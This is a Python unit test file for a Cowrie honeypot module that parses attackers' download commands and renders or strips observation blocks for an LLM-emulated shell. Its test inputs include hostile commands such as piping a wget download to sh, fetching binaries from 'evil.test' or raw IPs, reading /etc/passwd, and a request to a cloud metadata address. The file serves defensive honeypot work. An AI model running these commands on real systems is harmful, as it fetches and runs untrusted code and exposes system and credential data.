# SPDX-License-Identifier: BSD-3-Clause

"""Unit tests for cowrie.llm.downloader — parser + observation rendering.

The full fetch + Artifact + treq + SSRF path is exercised by manual
end-to-end testing, not by a unit test, because it requires either a
local HTTP server (flaky in CI) or stubbing the entire treq surface.
Parser correctness and observation framing are the higher-value targets.
"""

from __future__ import annotations

import unittest

from cowrie.llm.downloader import (
    DownloadIntent,
    FetchResult,
    parse_download_command,
    render_observation,
    strip_leaked_observation,
)


class TestParser(unittest.TestCase):
    def test_wget_simple_url(self):
        intent = parse_download_command("wget http://example.com/x.sh")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.tool, "wget")
        self.assertEqual(intent.url, "http://example.com/x.sh")
        self.assertIsNone(intent.outfile)

    def test_wget_with_outfile(self):
        intent = parse_download_command("wget -O /tmp/p http://1.2.3.4/payload")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.outfile, "/tmp/p")

    def test_wget_with_output_document_long(self):
        intent = parse_download_command(
            "wget --output-document=/tmp/q http://example.com/q"
        )
        self.assertIsNotNone(intent)
        self.assertEqual(intent.outfile, "/tmp/q")

    def test_wget_bare_hostname_gets_http_scheme(self):
        intent = parse_download_command("wget example.com/x")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.url, "http://example.com/x")

    def test_curl_with_output(self):
        intent = parse_download_command("curl -o /tmp/m https://evil.test/m")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.tool, "curl")
        self.assertEqual(intent.outfile, "/tmp/m")

    def test_curl_with_remote_name(self):
        intent = parse_download_command("curl -O http://example.com/foo/bar.bin")
        self.assertEqual(intent.outfile, "bar.bin")

    def test_tftp_busybox_form(self):
        intent = parse_download_command("tftp -g -r evil.bin 1.2.3.4")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.tool, "tftp")
        self.assertEqual(intent.url, "tftp://1.2.3.4/evil.bin")
        self.assertEqual(intent.outfile, "evil.bin")

    def test_ftpget_positional(self):
        intent = parse_download_command("ftpget 1.2.3.4 /tmp/local /remote/file")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.tool, "ftpget")
        self.assertIn("1.2.3.4", intent.url)
        self.assertIn("/remote/file", intent.url)
        self.assertEqual(intent.outfile, "/tmp/local")

    def test_returns_none_for_non_download(self):
        for cmd in ["ls -la", "whoami", "cat /etc/passwd", "", "   "]:
            self.assertIsNone(parse_download_command(cmd), msg=cmd)

    def test_returns_none_for_unparseable_quotes(self):
        # shlex.split raises ValueError on unbalanced quotes — parser
        # should swallow that and return None rather than crashing the
        # protocol's lineReceived callback.
        self.assertIsNone(parse_download_command("wget 'http://broken"))

    def test_pipeline_first_command_wins(self):
        intent = parse_download_command("wget http://a.com/x | sh")
        self.assertIsNotNone(intent)
        self.assertEqual(intent.url, "http://a.com/x")
        # ls is not a download, so a pipeline starting with ls returns None.
        self.assertIsNone(parse_download_command("ls /tmp; wget http://a.com/x"))


class TestObservationRendering(unittest.TestCase):
    def test_success_block_includes_facts(self):
        intent = DownloadIntent(
            tool="wget",
            url="http://example.com/x",
            outfile="/tmp/x",
            raw_command="wget http://example.com/x -O /tmp/x",
        )
        result = FetchResult(
            outcome="success",
            url="http://example.com/x",
            saved_to="/tmp/x",
            bytes_downloaded=528,
            bytes_advertised=528,
            sha256="abcd1234",
            http_status=200,
            content_type="text/plain",
            duration_seconds=1.3,
        )
        rendered = render_observation(intent, result)
        self.assertIn("[SHELL_OBSERVED]", rendered)
        self.assertIn("[/SHELL_OBSERVED]", rendered)
        self.assertIn("outcome: success", rendered)
        self.assertIn("bytes_downloaded: 528", rendered)
        self.assertIn("sha256: abcd1234", rendered)
        self.assertIn("http_status: 200", rendered)

    def test_failed_block_includes_error(self):
        intent = DownloadIntent(
            tool="wget",
            url="http://169.254.169.254/x",
            outfile=None,
            raw_command="wget http://169.254.169.254/x",
        )
        result = FetchResult(
            outcome="failed_blocked",
            url="http://169.254.169.254/x",
            error_message="Connection refused.",
        )
        rendered = render_observation(intent, result)
        self.assertIn("outcome: failed_blocked", rendered)
        self.assertIn("Connection refused", rendered)


class TestLeakStrip(unittest.TestCase):
    def test_clean_output_passthrough(self):
        text, leaked = strip_leaked_observation("hello world\n")
        self.assertFalse(leaked)
        self.assertEqual(text, "hello world\n")

    def test_full_marker_pair_stripped(self):
        leaky = (
            "before\n"
            "[SHELL_OBSERVED]\nsensitive stuff\n[/SHELL_OBSERVED]\n"
            "after"
        )
        text, leaked = strip_leaked_observation(leaky)
        self.assertTrue(leaked)
        self.assertNotIn("[SHELL_OBSERVED]", text)
        self.assertNotIn("[/SHELL_OBSERVED]", text)
        self.assertNotIn("sensitive stuff", text)
        self.assertIn("before", text)
        self.assertIn("after", text)

    def test_orphan_marker_also_stripped(self):
        text, leaked = strip_leaked_observation("body [SHELL_OBSERVED] more")
        self.assertTrue(leaked)
        self.assertNotIn("[SHELL_OBSERVED]", text)
